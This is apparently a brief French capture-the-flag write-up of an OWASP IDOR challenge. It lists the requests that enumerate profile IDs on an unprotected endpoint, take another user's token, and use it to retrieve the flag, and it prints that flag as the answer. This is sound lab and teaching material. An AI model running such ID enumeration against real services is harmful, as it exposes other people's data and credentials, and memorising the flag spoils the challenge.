# Challenge OWASP – IDOR

## Scénario
API de profils expose `/profile?id=...` sans contrôle d'accès. Récupérer le token d'un autre utilisateur pour obtenir le flag.

## Étapes
- Appeler `GET /profile?id=1` (alice) et `GET /profile?id=2` (bob)
- Le token de Bob est renvoyé: `bob-456`
- Appeler `GET /flag?token=bob-456` → `CTF{owasp_idor_easy}`

## Flag
`CTF{owasp_idor_easy}`
